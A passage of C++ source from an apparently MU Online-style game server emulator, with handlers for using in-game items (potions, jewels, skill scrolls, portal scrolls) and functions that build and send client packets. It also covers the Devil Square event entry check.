				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}
		}
		else if ( citem->m_Type == ITEMGET(14,8) ) // Antidote
		{
			if ( !gObjSearchItemMinus(&gObj[aIndex], pos, 1) )
			{
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}
			
			if ( gObj[aIndex].m_PoisonBeattackCount )
			{
				gObj[aIndex].m_PoisonType = 0;
				gObj[aIndex].m_PoisonAdd = 0;
				gObj[aIndex].m_PoisonBeattackCount = 0;
				gObj[aIndex].lpAttackObj = NULL;
				GCMagicCancelSend(&gObj[aIndex], 1);
			}

			if ( gObj[aIndex].m_ColdBeattackCount != 0 )
			{
				gObj[aIndex].m_ColdBeattackCount = 0;
				gObj[aIndex].DelayActionTime = 0;
				gObj[aIndex].DelayLevel = 0;
				gObj[aIndex].lpAttackObj = NULL;
				GCMagicCancelSend(&gObj[aIndex], 7);
			}
		}
		else if ( citem->m_Type >= ITEMGET(14,85) && citem->m_Type <= ITEMGET(14,88))
		{
			int Tmp_Type = citem->m_Type;
			if ( !gObjSearchItemMinus(&gObj[aIndex], pos, 1) )
			{

				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}
			g_ItemAddOption.SetItemEffect(&gObj[aIndex], Tmp_Type, 0);
		}
		else if ( citem->m_Type == ITEMGET(14,46) )
		{
			if ( !gObjSearchItemMinus(&gObj[aIndex], pos, 1) )
			{
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}

			g_ItemAddOption.SetItemEffect(&gObj[aIndex], ITEMGET(14,46), 0);
		}
		else if ( citem->m_Type == ITEMGET(14,47) )
		{
			if ( !gObjSearchItemMinus(&gObj[aIndex], pos, 1) )
			{
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}

			g_ItemAddOption.SetItemEffect(&gObj[aIndex], ITEMGET(14,47), 0);
		}
		else if ( citem->m_Type == ITEMGET(14,48) )
		{
			if ( !gObjSearchItemMinus(&gObj[aIndex], pos, 1) )
			{
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}

			g_ItemAddOption.SetItemEffect(&gObj[aIndex], ITEMGET(14,48), 0);
		}
		else if ( citem->m_Type == ITEMGET(14,49) )
		{
			if ( !gObjSearchItemMinus(&gObj[aIndex], pos, 1) )
			{
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}

			g_ItemAddOption.SetItemEffect(&gObj[aIndex], ITEMGET(14,49), 0);
		}
		else if ( citem->m_Type == ITEMGET(14,50) )
		{
			if ( !gObjSearchItemMinus(&gObj[aIndex], pos, 1) )
			{
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}

			g_ItemAddOption.SetItemEffect(&gObj[aIndex], ITEMGET(14,50), 0);
		}
		else if ( g_kJewelOfHarmonySystem.IsJewelOfHarmonyPurity(citem->m_Type) == TRUE )
		{
			if ( g_kJewelOfHarmonySystem.StrengthenItemByJewelOfHarmony(&gObj[aIndex], lpMsg->inventoryPos, lpMsg->invenrotyTarget) == TRUE )
			{
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemOneSend(aIndex, lpMsg->invenrotyTarget);
				GCInventoryItemDeleteSend(aIndex, pos, 1);
				MuItemShop.ItemSendTime(aIndex,lpMsg->invenrotyTarget);
			}
			else
			{
				GCReFillSend(aIndex, gObj[aIndex].Life, 0xFD, 1, gObj[aIndex].iShield);
			}
		}
		else if ( g_kJewelOfHarmonySystem.IsJewelOfHarmonySmeltingItems(citem->m_Type) == TRUE )
		{
			if ( g_kJewelOfHarmonySystem.SmeltItemBySmeltingStone(&gObj[aIndex], lpMsg->inventoryPos, lpMsg->invenrotyTarget) == TRUE )
			{
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemOneSend(aIndex, lpMsg->invenrotyTarget);
				GCInventoryItemDeleteSend(aIndex, pos, 1);
				MuItemShop.ItemSendTime(aIndex,lpMsg->invenrotyTarget);
			}
			else
			{
				GCReFillSend(aIndex, gObj[aIndex].Life, 0xFD, 1, gObj[aIndex].iShield);
			}
		}
		else if ( citem->m_Type == ITEMGET(14,160) ) //Jewel of Extension
		{
			if ( gObjItemLuckyDurablityUp(&gObj[aIndex], lpMsg->inventoryPos, lpMsg->invenrotyTarget) == TRUE )
			{
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemOneSend(aIndex, lpMsg->invenrotyTarget);
				GCInventoryItemDeleteSend(aIndex, pos, 1);
				MuItemShop.ItemSendTime(aIndex,lpMsg->invenrotyTarget);
			}else
			{
				GCReFillSend(aIndex, gObj[aIndex].Life, 0xFD, 1, gObj[aIndex].iShield);
			}
		}
		else if ( citem->m_Type == ITEMGET(14,161) ) //Jewel of Elevation
		{
			if ( gObjItemLuckyRefineryUp(&gObj[aIndex], lpMsg->inventoryPos, lpMsg->invenrotyTarget) == TRUE )
			{
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemOneSend(aIndex, lpMsg->invenrotyTarget);
				GCInventoryItemDeleteSend(aIndex, pos, 1);
				MuItemShop.ItemSendTime(aIndex,lpMsg->invenrotyTarget);
			}else
			{
				GCReFillSend(aIndex, gObj[aIndex].Life, 0xFD, 1, gObj[aIndex].iShield);
			}
		}
		else if ( citem->m_Type == ITEMGET(14,13) ) // Jewel Of Bless
		{
			if ( gObjItemLevelUp(&gObj[aIndex], lpMsg->inventoryPos, lpMsg->invenrotyTarget) == TRUE )
			{
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemOneSend(aIndex, lpMsg->invenrotyTarget);
				GCInventoryItemDeleteSend(aIndex, pos, 1);
				MuItemShop.ItemSendTime(aIndex,lpMsg->invenrotyTarget);
			}
		}
		else if ( citem->m_Type == ITEMGET(14,14) ) // Jewel Of Soul
		{
			if ( gObjItemRandomLevelUp(&gObj[aIndex], lpMsg->inventoryPos, lpMsg->invenrotyTarget) == TRUE )
			{
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemOneSend(aIndex, lpMsg->invenrotyTarget);
				GCInventoryItemDeleteSend(aIndex, pos, 1);
				MuItemShop.ItemSendTime(aIndex,lpMsg->invenrotyTarget);
			}
		}
		else if ( citem->m_Type == ITEMGET(14,16) ) // Jewel Of Life
		{
			if ( gObjItemRandomOption3Up(&gObj[aIndex], lpMsg->inventoryPos, lpMsg->invenrotyTarget) == TRUE )
			{
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemOneSend(aIndex, lpMsg->invenrotyTarget);
				GCInventoryItemDeleteSend(aIndex, pos, 1);
				MuItemShop.ItemSendTime(aIndex,lpMsg->invenrotyTarget);
			}
			else
			{
				GCReFillSend(aIndex, gObj[aIndex].Life, 0xFD, 1, gObj[aIndex].iShield);
			}
		}
#if (CRYSTAL_EDITION==1)
		else if( CJewel.IsJewel(citem->m_Type) >= 0 )
		{
			if(CJewel.Apply(&gObj[aIndex], lpMsg->inventoryPos, lpMsg->invenrotyTarget) == true)
			{
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemOneSend(aIndex, lpMsg->invenrotyTarget);
				GCInventoryItemDeleteSend(aIndex, pos, 1);
				MuItemShop.ItemSendTime(aIndex,lpMsg->invenrotyTarget);
			}
		}
#endif
		else if ( citem->m_Type >= ITEMGET(15,0) ||	// Group 15 - Scrolls
				  citem->m_Type == ITEMGET(12,7) || // Orb of Twisting Slash
				 (citem->m_Type >= ITEMGET(12,8) && citem->m_Type <= ITEMGET(12,24) ) ||	// Orbs
				 (citem->m_Type >= ITEMGET(12,44) && citem->m_Type <= ITEMGET(12,48) ) ||	// Orbs
				  citem->m_Type == ITEMGET(12,35) )	// Scroll of Fire Scream
		{
			if ( (gObj[aIndex].Strength + gObj[aIndex].AddStrength) < citem->m_RequireStrength )
			{
				GCServerMsgStringSend ("Not Enough Strength",aIndex,0x01 );
				GCReFillSend(aIndex, gObj[aIndex].Life, 0xFD, 1, gObj[aIndex].iShield);
				return;
			}
			
			if ( (gObj[aIndex].Dexterity + gObj[aIndex].AddDexterity) < citem->m_RequireDexterity )
			{
				GCServerMsgStringSend ("Not Enough Dexterity",aIndex,0x01 );
				GCReFillSend(aIndex, gObj[aIndex].Life, 0xFD, 1, gObj[aIndex].iShield);
				return;
			}

			if ( citem->m_Type == ITEMGET(15,18) )	// Scroll of HellBurst
			{
				if ( g_QuestInfo.GetQuestState(&gObj[aIndex], 2) != 2 )
				{
					GCServerMsgStringSend ("Quest Not Complete",aIndex,0x01 );
					GCReFillSend(aIndex, gObj[aIndex].Life, 0xFD, 1, gObj[aIndex].iShield);
					return;
				}
			}

			if (citem->m_Type >= ITEMGET(12,8) && citem->m_Type <= ITEMGET(12,24) )
			{
				if ( gObj[aIndex].Level < citem->m_RequireLevel )	// Orbs
				{
					GCServerMsgStringSend ("Level Too Low",aIndex,0x01 );
					GCReFillSend(aIndex, gObj[aIndex].Life, 0xFD, 1, gObj[aIndex].iShield);
					return;
				}
			}

			WORD skillnumber;

			if ( citem->IsClass(gObj[aIndex].Class, gObj[aIndex].ChangeUP) == FALSE )
			{	
				GCServerMsgStringSend ("Wrong Item Class",aIndex,0x01 );
				GCInventoryItemDeleteSend(aIndex, -1, 1);
			}
			else
			{
				int addskill = gObjMagicAdd(&gObj[aIndex], citem->m_Type>>(9), citem->m_Type %  MAX_SUBTYPE_ITEMS, citem->m_Level, skillnumber);

				if ( addskill >= 0 )
				{
					GCServerMsgStringSend ("Adding New Skill",aIndex,0x01 );
					gObjInventoryItemSet(aIndex, pos, -1);
					GCMagicListOneSend(aIndex, addskill, skillnumber, citem->m_Level, 0, 0);
					gObj[aIndex].pInventory[pos].Clear();
					GCInventoryItemDeleteSend(aIndex, pos, 1);
				}
				else
				{
					GCServerMsgStringSend ("Cant Find Skill for Item",aIndex,0x01 );
					GCInventoryItemDeleteSend(aIndex, -1, 1);
				}
			}
		}
		else if ( citem->m_Type == ITEMGET(14,10) ) // Town Portal Scroll
		{
			LogAddTD("[Using Item] [Return Scroll] [%s][%s] - Current Map:[%d]",
				gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].MapNumber);

			if ( BC_MAP_RANGE(gObj[aIndex].MapNumber) )
			{
				int BCRest = MAP_INDEX_BLOODCASTLE1;
				if(gObj[aIndex].MapNumber == MAP_INDEX_BLOODCASTLE8)
					BCRest = 45;
				if ( g_BloodCastle.GetCurrentState(gObj[aIndex].MapNumber-BCRest) == 2 )
				{
					g_BloodCastle.SearchUserDropQuestItem(aIndex);
				}
				else
				{
					g_BloodCastle.SearchUserDeleteQuestItem(aIndex);
				}
			}

			if ( gObj[aIndex].m_IfState.use && gObj[aIndex].m_IfState.type == 3 )
			{
				gObj[aIndex].TargetShopNumber = -1;
				gObj[aIndex].m_IfState.type = 0;
				gObj[aIndex].m_IfState.use = 0;
			}

			gObjInventoryItemSet(aIndex, pos, -1);
			gObj[aIndex].pInventory[pos].Clear();
			GCInventoryItemDeleteSend(aIndex, pos, 1);

			if ( gObj[aIndex].MapNumber == MAP_INDEX_DEVIAS )
			{
				gObjMoveGate(aIndex, 22);
			}
			else if ( gObj[aIndex].MapNumber == MAP_INDEX_NORIA )
			{
				gObjMoveGate(aIndex, 27);
			}
			else if ( gObj[aIndex].MapNumber == MAP_INDEX_LOSTTOWER )
			{
				gObjMoveGate(aIndex, 42);
			}
			else if ( gObj[aIndex].MapNumber == MAP_INDEX_ATLANS )
			{
				gObjMoveGate(aIndex, 49);
			}
			else if ( gObj[aIndex].MapNumber == MAP_INDEX_TARKAN )
			{
				gObjMoveGate(aIndex, 57);
			}
			else if ( BC_MAP_RANGE(gObj[aIndex].MapNumber) != FALSE )
			{
				gObjMoveGate(aIndex, 22);
			}
			else if ( CC_MAP_RANGE(gObj[aIndex].MapNumber) != FALSE )
			{
				gObjMoveGate(aIndex, 22);
			}
			else if ( KALIMA_MAP_RANGE(gObj[aIndex].MapNumber) != FALSE )
			{
				gObjMoveGate(aIndex, 22);
			}
			else if ( gObj[aIndex].MapNumber == MAP_INDEX_AIDA )
			{
				gObjMoveGate(aIndex, 27);
			}
			else if ( gObj[aIndex].MapNumber == MAP_INDEX_CRYWOLF_FIRSTZONE )
			{
				gObjMoveGate(aIndex, 27);
			}
#if (GS_CASTLE)			
			else if ( gObj[aIndex].MapNumber == MAP_INDEX_CASTLESIEGE )
            {
				if ( g_CastleSiege.GetCastleState() == 7 )
				{
					if ( gObj[aIndex].m_btCsJoinSide == 1 )
						gObjMoveGate(aIndex, 101);
					else
						gObjMoveGate(aIndex, 100);
				}
				else
                {
					if ( g_CastleSiege.CheckCastleOwnerMember(aIndex) != TRUE && g_CastleSiege.CheckCastleOwnerUnionMember(aIndex) != TRUE )
						gObjMoveGate(aIndex, 100);
					else
						gObjMoveGate(aIndex, 101);
				}
			}           
#endif
			else
			{
				gObjMoveGate(aIndex, 17);
			}
		}
		
#if (PACK_EDITION>=2)
		else if ( citem->m_Type == ITEMGET(13,66) ) // Santa Portal Invitation
		{
			if (XMasEvent.AllowInvitation == 1)
			{
				LogAddTD("[Using Item] [Santa Invitation] [%s][%s]",
					gObj[aIndex].AccountID, gObj[aIndex].Name);

				if ( BC_MAP_RANGE(gObj[aIndex].MapNumber) )
				{
					int BCRest = MAP_INDEX_BLOODCASTLE1;
					if(gObj[aIndex].MapNumber == MAP_INDEX_BLOODCASTLE8)
						BCRest = 45;
					if ( g_BloodCastle.GetCurrentState(gObj[aIndex].MapNumber-BCRest) == 2 )
					{
						g_BloodCastle.SearchUserDropQuestItem(aIndex);
					}
					else
					{
						g_BloodCastle.SearchUserDeleteQuestItem(aIndex);
					}
				}

				if ( gObj[aIndex].m_IfState.use && gObj[aIndex].m_IfState.type == 3 )
				{
					gObj[aIndex].TargetShopNumber = -1;
					gObj[aIndex].m_IfState.type = 0;
					gObj[aIndex].m_IfState.use = 0;
				}

				//Multi-Use for tikets based on durability
				gObj[aIndex].pInventory[pos].m_Durability -= 1;

				if (gObj[aIndex].pInventory[pos].m_Durability <= 0)
				{
					gObjInventoryItemSet(aIndex, pos, -1);
					gObj[aIndex].pInventory[pos].Clear();
					GCInventoryItemDeleteSend(aIndex, pos, 1);
				} else {
					GCItemDurSend(aIndex, pos, gObj[aIndex].pInventory[pos].m_Durability, 0);
				}

				gObjTeleport(aIndex, 62, (216 + (rand()%10)), 23);
			} else {
				GCServerMsgStringSend ("[Event] XMas Event is now disabled!",aIndex,0x01 ) ;
			}
		}
#endif
		else if ( citem->m_Type == ITEMGET(14,9) ) // Ale
		{
			int level = citem->m_Level;

			gObjInventoryItemSet(aIndex, pos, -1);
			gObj[aIndex].pInventory[pos].Clear();
			GCInventoryItemDeleteSend(aIndex, pos, 1);
			gObjUseDrink(&gObj[aIndex], level);
		}
		else if ( citem->m_Type == ITEMGET(14,20) ) // Remedy of Love
		{
			if ( citem->m_Level == 0 )
			{
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
				gObjUseDrink(&gObj[aIndex], 2);
			}
		}
		else if ( citem->m_Type == ITEMGET(13,15) ) // Fruits
		{
			if ( iItemUseType == 0 )
			{
				gObjUsePlusStatFruit(aIndex, pos);
			}
			else if ( iItemUseType == 1 )
			{
				gObjUseMinusStatFruit(aIndex, pos);
			}
		}
		else if ( citem->m_Type == ITEMGET(14,7) )	// Siege Potion
		{
			if(g_CastleSiegeSync.GetCastleState() == 7) //Good
			{
				if (gObj[aIndex].MapNumber != MAP_INDEX_CASTLESIEGE)
				{	//You can not use this potion outside of Castle Siege
					::GCServerMsgStringSend("Cant use this potion outside Castle Siege",aIndex,1);
					return;
				}
			} else {
				::GCServerMsgStringSend("Cant use this potion outside Castle Siege",aIndex,1);
				return;
			}

			if ( !gObjSearchItemMinus(&gObj[aIndex], pos, 1) )
			{
				gObjInventoryItemSet(aIndex, pos, -1);
				gObj[aIndex].pInventory[pos].Clear();
				GCInventoryItemDeleteSend(aIndex, pos, 1);
			}
			
			int iLevel = citem->m_Level;
			int iSerial = citem->GetNumber();
			int iDur = citem->m_Durability;

			if ( gObj[aIndex].lpGuild )
			{
				LogAddTD("[CastleSiege] Using CastleSiege Potion Lv[%d]/Si[%d]/Dur[%d] - [%s][%s] - (Guild : %s)",
					iLevel, iSerial, iDur, gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].lpGuild->Name);
			}
			else
			{
				LogAddTD("[CastleSiege] Using CastleSiege Potion Lv[%d]/Si[%d]/Dur[%d] - [%s][%s]",
					iLevel, iSerial, iDur, gObj[aIndex].AccountID, gObj[aIndex].Name);
			}

			if ( iLevel == 0 )
			{
				gObjUseBlessAndSoulPotion(aIndex, iLevel);
			}
			else if ( iLevel == 1 )
			{
				gObjUseBlessAndSoulPotion(aIndex, iLevel);
			}
		}
		else if ( citem->m_Type == ITEMGET(13,48) )
		{
			if ( (gObj[aIndex].MapNumber < MAP_INDEX_KALIMA1 || gObj[aIndex].MapNumber > MAP_INDEX_KALIMA6 ) && gObj[aIndex].MapNumber != MAP_INDEX_KALIMA7 )
			{
				int iLevel = g_KalimaGate.GetKalimaGateLevel2(aIndex);
				BOOL bKalimaGateCreateResult = FALSE;
				int iKalimaGateX = 0;
				int iKalimaGateY = 0;

				iLevel++;
				iKalimaGateX = gObj[aIndex].X + rand()%6 - 2;
				iKalimaGateY = gObj[aIndex].Y + rand()%6 - 2;

				bKalimaGateCreateResult = g_KalimaGate.CreateKalimaGate(aIndex, iLevel, iKalimaGateX, iKalimaGateY);

				if ( bKalimaGateCreateResult == TRUE )
				{
					if ( !gObjSearchItemMinus(&gObj[aIndex], pos, 1) )
					{
						gObjInventoryItemSet(aIndex, pos, -1);
						gObj[aIndex].pInventory[pos].Clear();
						GCInventoryItemDeleteSend(aIndex, pos, 1);
					}

					LogAddTD("[PCS] Use Free Kalima Ticket Success");
				}
				else
				{
					LogAddTD("[PCS] Use Free Kalima Ticket Failed");
				}
			}
		}
		else
		{
			//LogAdd("error-L3 : %s return %s %d %d %s",
			//	gObj[aIndex].Name, __FILE__,__LINE__, pos, CItem::GetName);	// #error Convert to other Name

			GCReFillSend(aIndex, gObj[aIndex].Life, 0xFD, 1, gObj[aIndex].iShield);
		}
	}
	else
	{
		GCReFillSend(aIndex, gObj[aIndex].Life, 0xFD, 1, gObj[aIndex].iShield);
		LogAdd("error-L3 : %s return %s %d %d",
			gObj[aIndex].Name, __FILE__,__LINE__, pos);
	}
}



struct PMSG_REFILL
{
	PBMSG_HEAD h;	// C1:26
	BYTE IPos;	// 3
	BYTE LifeH;	// 4
	BYTE LifeL;	// 5
	BYTE Flag;	// 6
	BYTE btShieldH;	// 7
	BYTE btShieldL;	// 8
};




void GCReFillSend(int aIndex, WORD Life, BYTE Ipos, unsigned char flag,  WORD wShield)
{
	PMSG_REFILL pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x26, sizeof(pMsg));
	pMsg.IPos = Ipos;
	pMsg.LifeH = SET_NUMBERH(Life);
	pMsg.LifeL = SET_NUMBERL(Life);
	pMsg.btShieldH = SET_NUMBERH(wShield);
	pMsg.btShieldL = SET_NUMBERL(wShield);
	pMsg.Flag = 0;	// #error Flag is Disabled

	DataSend(aIndex, (UCHAR*)&pMsg, pMsg.h.size);
}



struct PMSG_MANASEND
{
	PBMSG_HEAD h;	// C1:27
	BYTE IPos;	// 3
	BYTE ManaH;	// 4
	BYTE ManaL;	// 5
	BYTE BPH;	// 6
	BYTE BPL;	// 7
};


void GCManaSend(int aIndex, short Mana, BYTE Ipos, unsigned char flag,  WORD BP)
{
	if ( aIndex < 0 || aIndex > OBJMAX-1)
	{
		LogAdd("GCManaSend() return %s %d", __FILE__, __LINE__);
		return;
	}

	if ( gObj[aIndex].Type != OBJ_USER )
	{
		return;
	}

	PMSG_MANASEND pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x27, sizeof(pMsg));
	pMsg.IPos = Ipos;
	pMsg.ManaH = SET_NUMBERH(Mana);
	pMsg.ManaL = SET_NUMBERL(Mana);
	pMsg.BPH = SET_NUMBERH(BP);
	pMsg.BPL = SET_NUMBERL(BP);

	DataSend(aIndex, (UCHAR*)&pMsg, pMsg.h.size);
}



struct PMSG_INVENTORYDELETE
{
	PBMSG_HEAD h;	// C1:28
	BYTE IPos;	// 3
	BYTE Flag;	// 4
};


void GCInventoryItemDeleteSend(int aIndex, BYTE pos, unsigned char flag)
{
	PMSG_INVENTORYDELETE pMsg;
	
	PHeadSetB((LPBYTE)&pMsg, 0x28, sizeof(pMsg));
	pMsg.IPos = pos;
	pMsg.Flag = flag;

	DataSend(aIndex, (UCHAR*)&pMsg, pMsg.h.size);
}



struct PMSG_ITEMUSESPECIALTIME
{
	PBMSG_HEAD h;	// C1:29
	BYTE Number;	// 3
	WORD Time;	// 4
};

void GCItemUseSpecialTimeSend(int aIndex, unsigned char number, int time)
{
	if ( time > 65535 )
	{
		time = 65535;
	}

	PMSG_ITEMUSESPECIALTIME pMsg;

	PHeadSetBE((LPBYTE)&pMsg, 0x29, sizeof(pMsg));
	pMsg.Number = number;
	pMsg.Time = time;

	DataSend(aIndex, (UCHAR*)&pMsg, pMsg.h.size);
}


struct PMSG_ITEMDUR
{
	PBMSG_HEAD h;	// C1:2A
	BYTE IPos;	// 3
	BYTE Dur;	// 4
	BYTE Flag;	// 5
};



void GCItemDurSend(int aIndex, BYTE pos, BYTE dur, unsigned char flag)
{
	PMSG_ITEMDUR pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x2A, sizeof(pMsg));
	pMsg.IPos = pos;
	pMsg.Dur = dur;
	pMsg.Flag = flag;

	DataSend(aIndex, (UCHAR*)&pMsg, pMsg.h.size);
}




void GCItemDurSend2(int aIndex, unsigned char pos, unsigned char dur, unsigned char flag)
{
	PMSG_ITEMDUR pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x2A, sizeof(pMsg));
	pMsg.IPos = pos;
	pMsg.Dur = dur;
	pMsg.Flag = flag;

	DataSend(aIndex, (UCHAR*)&pMsg, pMsg.h.size);
}



struct PMSG_WEATHER
{
	PBMSG_HEAD h;	// C1:0F
	BYTE Weather;	// 3
};


void CGWeatherSend(int aIndex, BYTE weather)
{
	PMSG_WEATHER pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x0F, sizeof(pMsg));
	pMsg.Weather = weather;

	DataSend(aIndex, (UCHAR*)&pMsg, pMsg.h.size);
}





void GCServerCmd(int aIndex, BYTE type, BYTE Cmd1, BYTE Cmd2)
{
	PMSG_SERVERCMD ServerCmd;

	PHeadSubSetB((LPBYTE)&ServerCmd, 0xF3, 0x40, sizeof(ServerCmd));
	ServerCmd.CmdType = type;
	ServerCmd.X = Cmd1;
	ServerCmd.Y = Cmd2;

	DataSend(aIndex, (UCHAR*)&ServerCmd, ServerCmd.h.size);
}



struct PMSG_RESULT_MOVEDEVILSQUARE
{
	PBMSG_HEAD h;	// C1:90
	BYTE Result;	// 3
};


void GCReqmoveDevilSquare(PMSG_REQ_MOVEDEVILSQUARE* lpMsg, int aIndex)
{
	if ( aIndex < 0 || aIndex > OBJMAX-1 )
	{
		LogAdd("return %s %d", __FILE__, __LINE__);
		return;
	}

	BYTE cSquareNumber = lpMsg->SquareNumber;
	BYTE cInvitationItemPos = lpMsg->InvitationItemPos - INVENTORY_BAG_START;

	if ( gObj[aIndex].m_IfState.use && gObj[aIndex].m_IfState.type != 12 )
		return;

	PMSG_RESULT_MOVEDEVILSQUARE pResult;

	PHeadSetB((LPBYTE)&pResult, 0x90, sizeof(pResult));
	pResult.Result = 0;

	LPOBJ lpObj = &gObj[aIndex];

	LogAddTD("[DevilSquare] [%s][%s] Request Move DevilSquare [%d][%d][%d]",
		lpObj->AccountID, lpObj->Name, lpObj->Class, lpObj->Level, cSquareNumber+1);

	if ( gObj[aIndex].m_PK_Level >= 4 )
	{
		pResult.Result = 6;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	if ( ReadConfig.MAIN_INVENTORY_RANGE(aIndex,cInvitationItemPos,false) == FALSE )
	{
		pResult.Result = 1;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

		LogAddTD("[DevilSquare] [%s][%s] Move DevilSquare Fail [%d][%d][%d]",
			lpObj->AccountID, lpObj->Name, lpObj->Class, lpObj->Level, cSquareNumber+1);

		return;
	}

	if ( DS_LEVEL_RANGE(cSquareNumber) == FALSE )
	{
		pResult.Result = 1;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

		LogAddTD("[DevilSquare] [%s][%s] Move DevilSquare Fail [%d][%d][%d]",
			lpObj->AccountID, lpObj->Name, lpObj->Class, lpObj->Level, cSquareNumber+1);

		return;
	}

	if ( g_DevilSquare.GetState() != DevilSquare_OPEN )
	{
		pResult.Result = 2;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

		LogAddTD("[DevilSquare] [%s][%s] Move DevilSquare Fail [%d][%d][%d]",
			lpObj->AccountID, lpObj->Name, lpObj->Class, lpObj->Level, cSquareNumber+1);

		return;
	}

	if ( g_DevilSquare.m_DevilSquareGround[cSquareNumber].GetObjCount() >= MAX_DEVILSQUARE_USER )
	{
		pResult.Result = 5;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

		LogAddTD("[DevilSquare] [%s][%s] Move DevilSquare Fail [%d][%d][%d]",
			lpObj->AccountID, lpObj->Name, lpObj->Class, lpObj->Level, cSquareNumber+1);

		return;
	}

	CItem * sitem = &lpObj->pInventory[cInvitationItemPos];

	if ( sitem->m_Type != ITEMGET(14,19) && ( sitem->m_Type != ITEMGET(13,46) || sitem->m_Durability <= 0.0f ) )	// Devil's Invitation
	{
		pResult.Result = 1;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

		LogAddTD("[DevilSquare] [%s][%s] Move DevilSquare Fail [%d][%d][%d]",
			lpObj->AccountID, lpObj->Name, lpObj->Class, lpObj->Level, cSquareNumber+1);

		return;
	}

	int ItemLevel = sitem->m_Level;

	if ( sitem->m_Type == ITEMGET(13,46) )
		ItemLevel = 10;

	int level = lpObj->Level;

	if ( lpObj->Class == CLASS_DARKLORD || lpObj->Class == CLASS_MAGICGLADIATOR || lpObj->Class == CLASS_RAGEFIGHTER )
	{
		level = (level+1)/2*3;
	}

	if ( ItemLevel != 0 )
	{
		if ( ItemLevel != 10 )
		{
			if ( ItemLevel != (cSquareNumber+1) )
			{
				pResult.Result = 1;
				DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

				LogAddTD("[DevilSquare] [%s][%s] Move DevilSquare Invitation LevelError [%d][%d][%d][%d]",
					lpObj->AccountID, lpObj->Name, lpObj->Class, lpObj->Level, cSquareNumber+1, ItemLevel);

				return;
			}
		}
	}

	BOOL bEnterCheck = FALSE;
	WORD movegateindex = 61;	// #gate
	int iENTER_LEVEL = g_DevilSquare.GetUserLevelToEnter(aIndex, movegateindex);

	if ( DS_LEVEL_RANGE(iENTER_LEVEL) == FALSE )
	{
		LogAddTD("[DevilSquare] [%s][%s] GetUserLevelToEnter() failed",
			lpObj->AccountID, lpObj->Name);

		return;
	}

	if ( ItemLevel == 10 )
		cSquareNumber = iENTER_LEVEL;

	if ( cSquareNumber != iENTER_LEVEL )
	{
		if ( cSquareNumber > iENTER_LEVEL )
		{
			bEnterCheck = 2;
		}
		else
		{
			bEnterCheck = 1;
		}
	}

	if ( bEnterCheck == 1 )
	{
		pResult.Result = 3;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

		LogAddTD("[DevilSquare] [%s][%s] Move DevilSquare Fail [%d][%d][%d][%d]",
			lpObj->AccountID, lpObj->Name, lpObj->Class, lpObj->Level, cSquareNumber, ItemLevel);

		return;
	}

	if ( bEnterCheck == 2 )
	{
		pResult.Result = 4;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

		LogAddTD("[DevilSquare] [%s][%s] Move DevilSquare Fail [%d][%d][%d][%d]",
			lpObj->AccountID, lpObj->Name, lpObj->Class, lpObj->Level, cSquareNumber, ItemLevel);

		return;
	}

	LogAddTD("[DevilSquare] [%s][%s] Move DevilSquare success [%d][%d] RemoveItem[%s][%d][%d][%d]",
		lpObj->AccountID, lpObj->Name, lpObj->Level, cSquareNumber, lpObj->pInventory[cInvitationItemPos].GetName(),
		cInvitationItemPos, ItemLevel, lpObj->pInventory[cInvitationItemPos].m_Number);

	if ( sitem->m_Type == ITEMGET(14,19) || (sitem->m_Type == ITEMGET(13,46) && sitem->m_Durability == 1.0f) )
	{
		gObjInventoryDeleteItem(aIndex, cInvitationItemPos);
